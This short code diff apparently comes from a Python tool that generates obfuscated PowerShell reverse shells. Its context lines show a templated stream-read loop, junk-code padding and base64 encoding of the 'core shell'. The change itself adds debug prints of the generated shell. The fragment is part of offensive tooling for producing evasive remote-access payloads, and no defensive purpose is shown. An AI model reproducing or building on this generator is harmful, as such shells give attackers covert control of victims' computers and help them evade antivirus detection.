@@ -89,6 +89,11 @@ while((${{var['i']}}=${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['by
 {junk_code()}
 """.strip()
 
+    print("=== CORE SHELL ===")
+    print(core_shell)
+    print("==================")
+
+
     # Always use base64 for compatibility
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
